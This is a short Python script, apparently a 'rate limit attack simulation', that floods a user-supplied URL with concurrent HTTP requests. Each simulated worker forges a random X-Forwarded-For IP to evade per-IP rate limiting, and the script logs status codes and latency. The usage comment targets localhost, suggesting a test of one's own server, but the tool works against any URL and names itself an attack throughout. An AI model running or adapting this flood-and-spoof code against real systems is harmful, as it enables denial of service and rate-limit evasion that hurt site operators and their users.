import asyncio
import httpx
import random
import time
import argparse
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn

console = Console()

# Random IP
def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# 1 Request
async def send_request(client: httpx.AsyncClient, url: str, headers: dict):
    start = time.perf_counter()
    try:
        r = await client.get(url, headers=headers)
        status = r.status_code
        ok = status < 400
    except Exception:
        status = "ERR"
        ok = False

    latency = int((time.perf_counter() - start) * 1000)
    return ok, status, latency


# -------------------------------------------------------------
# Worker
# -------------------------------------------------------------
async def worker(ip: str, url: str, request_count: int, delay: float, progress_task, progress):

    stats = {
        "200": 0,
        "403": 0,
        "429": 0,
        "other": 0,
        "err": 0,
        "latencies": []
    }

    headers = {"X-Forwarded-For": ip}

    async with httpx.AsyncClient(timeout=5) as client:
        for _ in range(request_count):
            ok, status, latency = await send_request(client, url, headers)
            progress.update(progress_task, advance=1)

            stats["latencies"].append(latency)

            if status == 200:
                stats["200"] += 1
            elif status == 403:
                stats["403"] += 1
            elif status == 429:
                stats["429"] += 1
            elif status == "ERR":
                stats["err"] += 1
            else:
                stats["other"] += 1

            if delay > 0:
                await asyncio.sleep(delay)

    return ip, stats


# Main Attack
async def multi_ip_flood(url: str, workers: int = 5, requests_per_worker: int = 100, delay: float = 0.0):

    ips = [rand_ip() for _ in range(workers)]
    total_requests = workers * requests_per_worker

    console.print("\n[bold yellow]Attackers:[/bold yellow]")
    for ip in ips:
        console.print(f" • {ip}")

    console.print("\n[bold cyan]Launching flood...[/bold cyan]\n")

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold blue]Flood Running[/bold blue]"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
    ) as progress:

        task_id = progress.add_task("flood", total=total_requests)

        tasks = [
            asyncio.create_task(worker(ip, url, requests_per_worker, delay, task_id, progress))
            for ip in ips
        ]

        results = await asyncio.gather(*tasks)

    # Log File
    with open("results.log", "w") as f:

        f.write("===== FLOOD TEST RESULTS =====\n")
        f.write(f"URL: {url}\n")
        f.write(f"Workers: {workers}\n")
        f.write(f"Requests per worker: {requests_per_worker}\n")
        f.write(f"Total Requests: {total_requests}\n")
        f.write(f"Delay per request: {delay} sec\n\n")

        for ip, stats in results:
            avg = sum(stats["latencies"]) / len(stats["latencies"])
            mn = min(stats["latencies"])
            mx = max(stats["latencies"])

            f.write(f"--- IP {ip} ---\n")
            f.write(f"200: {stats['200']}\n")
            f.write(f"403: {stats['403']}\n")
            f.write(f"429: {stats['429']}\n")
            f.write(f"Other: {stats['other']}\n")
            f.write(f"ERR: {stats['err']}\n")
            f.write(f"Latency avg: {avg:.2f} ms\n")
            f.write(f"Latency min: {mn} ms\n")
            f.write(f"Latency max: {mx} ms\n")
            f.write("\n")

    console.print("\n[bold green]✔ Flood Complete. See results.log[/bold green]\n")


# python te.py http://localhost:8000/ --ip 5 --requests 100 --sleep 0.1
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ratelimit Attack Simulation")

    parser.add_argument("url", help="Target URL, e.g. http://localhost:8000/")
    parser.add_argument("--ip", type=int, default=5, help="Number of IPs")
    parser.add_argument("--requests", type=int, default=100, help="Requests per IP")
    parser.add_argument("--sleep", type=float, default=0.0, help="Delay")

    args = parser.parse_args()

    asyncio.run(
        multi_ip_flood(
            args.url,
            workers=args.ip,
            requests_per_worker=args.requests,
            delay=args.sleep
        )
    )
